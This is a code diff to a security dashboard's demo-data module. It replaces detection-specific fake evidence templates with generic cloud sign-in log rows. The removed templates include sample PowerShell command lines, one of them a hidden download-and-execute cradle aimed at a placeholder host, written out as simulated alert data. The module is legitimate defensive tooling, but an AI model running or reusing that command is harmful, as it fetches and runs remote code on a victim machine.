@@ -234,121 +234,70 @@ export function getDemoEnrichedAccounts(): EnrichedAccount[] {
   return DEMO_ACCOUNTS.map(getDemoEnrichedAccount);
 }
 
-const EVIDENCE_TEMPLATES: Record<string, { keys: string[]; rowGenerator: (count: number) => EvidenceRow[] }> = {
-  "Brute Force Authentication Attempt": {
-    keys: ["__time_matched", "src_ip", "dst_ip", "user", "event_id", "status", "logon_type", "workstation"],
-    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
-      __time_matched: new Date(Date.now() - (i * 2000 + Math.random() * 5000)).toISOString(),
-      src_ip: "203.0.113.42",
-      dst_ip: "10.0.1.5",
-      user: ["jsmith", "admin", "svc_account", "jdoe", "mkellar"][i % 5],
-      event_id: "4625",
-      status: "0xc000006d",
-      logon_type: "3",
-      workstation: "DC-PRIMARY",
-    })),
-  },
-  "Suspicious PowerShell Execution": {
-    keys: ["__time_matched", "hostname", "user", "command_line", "parent_process", "pid", "event_id"],
-    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
-      __time_matched: new Date(Date.now() - (i * 60000 + Math.random() * 30000)).toISOString(),
-      hostname: "WS-042",
-      user: "jsmith",
-      command_line: [
-        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
-        "powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://mal.example/p')",
-        "powershell Set-ExecutionPolicy Bypass -Scope Process",
-      ][i % 3],
-      parent_process: ["cmd.exe", "explorer.exe", "svchost.exe"][i % 3],
-      pid: String(4000 + i * 127),
-      event_id: "4104",
-    })),
-  },
-  "Lateral Movement via SMB": {
-    keys: ["__time_matched", "src_ip", "dst_ip", "src_hostname", "dst_hostname", "share_name", "user", "action"],
-    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
-      __time_matched: new Date(Date.now() - (i * 5000 + Math.random() * 10000)).toISOString(),
-      src_ip: "10.0.1.15",
-      dst_ip: `10.0.1.${20 + (i % 12)}`,
-      src_hostname: "WS-015",
-      dst_hostname: ["SRV-APP-01", "SRV-APP-02", "DC-SECONDARY", "FS-01", "DB-PRIMARY", "WS-023"][i % 6],
-      share_name: ["C$", "ADMIN$", "IPC$", "SharedDocs"][i % 4],
-      user: "admin-temp",
-      action: ["connect", "read", "write"][i % 3],
-    })),
-  },
-  "Unauthorized Admin Account Created": {
-    keys: ["__time_matched", "target_user", "actor_user", "group_name", "event_id", "hostname", "action"],
-    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
-      __time_matched: new Date(Date.now() - (i * 120000 + Math.random() * 60000)).toISOString(),
-      target_user: "svc_backup2",
-      actor_user: "admin-temp",
-      group_name: ["Domain Admins", "Enterprise Admins", "Schema Admins"][i % 3],
-      event_id: ["4728", "4732", "4756"][i % 3],
-      hostname: "DC-PRIMARY",
-      action: ["Member added to group", "Account created", "Group membership changed"][i % 3],
-    })),
-  },
-  "Ransomware Behavior Detected": {
-    keys: ["__time_matched", "hostname", "user", "file_path", "action", "file_count", "process"],
-    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
-      __time_matched: new Date(Date.now() - (i * 500 + Math.random() * 1000)).toISOString(),
-      hostname: "FS-01",
-      user: "lthompson",
-      file_path: [
-        "\\\\FS-01\\shared\\accounting\\Q4-report.xlsx.encrypted",
-        "\\\\FS-01\\shared\\hr\\employee-data.csv.encrypted",
-        "\\\\FS-01\\shared\\projects\\design-specs.pdf.encrypted",
-        "\\\\FS-01\\shared\\legal\\contracts-2025.docx.encrypted",
-      ][i % 4],
-      action: "file_modified",
-      file_count: String(50 + i * 12),
-      process: "suspicious_process.exe",
-    })),
-  },
-};
+const DEMO_IPS = ["50.37.49.208", "203.0.113.42", "198.51.100.17", "172.16.0.55", "10.0.1.15", "192.168.1.100"];
+const DEMO_AGENTS = [
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
+  "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0)",
+];
+const DEMO_USERS_EVIDENCE = ["anna@b5alab.com", "jsmith@acmecorp.com", "admin@acmecorp.com", "mkellar@acmecorp.com", "rjohnson@globex.io", "svc_backup@initech.com"];
+const DEMO_OPERATIONS = ["UserLoggedIn", "UserLoginFailed", "FileAccessed", "MailItemsAccessed", "Add member to role.", "New-InboxRule", "Set-Mailbox"];
+const DEMO_RESULTS = ["Success", "Failure", "Success", "Success", "Failure"];
+const DEMO_TYPES = ["office365_aad", "office365_general", "windows_security", "azure_ad_signin", "okta_system_log"];
+const DEMO_COUNTRIES: [string, string][] = [["US", "United States"], ["GB", "United Kingdom"], ["DE", "Germany"], ["RU", "Russia"], ["CN", "China"], ["CA", "Canada"]];
 
-function getDefaultEvidenceForFinding(findingName: string): { keys: string[]; rowGenerator: (count: number) => EvidenceRow[] } {
-  return EVIDENCE_TEMPLATES[findingName] || {
-    keys: ["__time_matched", "src_ip", "hostname", "user", "event_type", "detail"],
-    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
-      __time_matched: new Date(Date.now() - (i * 30000 + Math.random() * 60000)).toISOString(),
-      src_ip: `10.0.${Math.floor(Math.random() * 5)}.${10 + i}`,
-      hostname: HOSTNAMES[i % HOSTNAMES.length],
-      user: ["jsmith", "admin", "svc_account", "mkellar", "rjohnson"][i % 5],
-      event_type: "security_alert",
-      detail: `Event detail row ${i + 1}`,
-    })),
+function buildEvidenceRow(i: number, baseTime: number): EvidenceRow {
+  const country = DEMO_COUNTRIES[i % DEMO_COUNTRIES.length];
+  const offset = i * 30000 + Math.floor(Math.random() * 60000);
+  const timeMatched = new Date(baseTime - offset).toISOString();
+  const timestampParsed = new Date(baseTime - offset + 2000 + Math.floor(Math.random() * 5000)).toISOString();
+  return {
+    __time_matched: timeMatched,
+    Logger: `${crypto.randomUUID?.() || `${i}-${Date.now()}`}`.slice(0, 36),
+    Timestamp: timeMatched,
+    agent: DEMO_AGENTS[i % DEMO_AGENTS.length],
+    client_ip: DEMO_IPS[i % DEMO_IPS.length],
+    "client_ip_geoip.countrycode": country[0],
+    "client_ip_geoip.countryname": country[1],
+    id: crypto.randomUUID?.() || `id-${i}-${Date.now()}`,
+    operation: DEMO_OPERATIONS[i % DEMO_OPERATIONS.length],
+    request_type: ["OAuth2:Authorize", "OAuth2:Token", "ROPC", "SAS"][i % 4],
+    result: DEMO_RESULTS[i % DEMO_RESULTS.length],
+    tenant_id: "5aa4588c-5c62-4629-82ca-18810e7c2d3d",
+    timestamp_parsed: timestampParsed,
+    type: DEMO_TYPES[i % DEMO_TYPES.length],
+    user: DEMO_USERS_EVIDENCE[i % DEMO_USERS_EVIDENCE.length],
   };
 }
 
+const DEFAULT_EVIDENCE_KEYS = [
+  "__time_matched", "Logger", "Timestamp", "agent", "client_ip",
+  "client_ip_geoip.countrycode", "client_ip_geoip.countryname",
+  "id", "operation", "request_type", "result", "tenant_id",
+  "timestamp_parsed", "type", "user",
+];
+
+function buildDemoEvidence(count: number): EvidenceRow[] {
+  const baseTime = Date.now();
+  return Array.from({ length: count }, (_, i) => buildEvidenceRow(i, baseTime));
+}
+
 export function getDemoFindingEvidence(
-  accountId: string,
-  findingId: string,
+  _accountId: string,
+  _findingId: string,
   page = 1,
   pageSize = 50
 ): EvidenceResponse {
-  const finding = getDemoFindingDetail(accountId, findingId);
-  if (!finding) {
-    return {
-      data: [],
-      evidence_keys: [],
-      status: "OK",
-      meta: { page: 1, page_size: pageSize, total_items: 0, total_pages: 0 },
-      links: { self: "", next: null, prev: null },
-    };
-  }
-
-  const template = getDefaultEvidenceForFinding(finding.name);
-  const totalItems = 8 + Math.floor(Math.random() * 20);
-  const allRows = template.rowGenerator(totalItems);
+  const totalItems = 12;
+  const allRows = buildDemoEvidence(totalItems);
   const totalPages = Math.ceil(totalItems / pageSize);
   const start = (page - 1) * pageSize;
   const pageRows = allRows.slice(start, start + pageSize);
 
   return {
     data: pageRows,
-    evidence_keys: template.keys,
+    evidence_keys: DEFAULT_EVIDENCE_KEYS,
     status: "OK",
     meta: {
       page,
@@ -357,9 +306,9 @@ export function getDemoFindingEvidence(
       total_pages: totalPages,
     },
     links: {
-      self: `/findings/${findingId}/evidence?page=${page}`,
-      next: page < totalPages ? `/findings/${findingId}/evidence?page=${page + 1}` : null,
-      prev: page > 1 ? `/findings/${findingId}/evidence?page=${page - 1}` : null,
+      self: `/findings/${_findingId}/evidence?page=${page}`,
+      next: page < totalPages ? `/findings/${_findingId}/evidence?page=${page + 1}` : null,
+      prev: page > 1 ? `/findings/${_findingId}/evidence?page=${page - 1}` : null,
     },
   };
 }
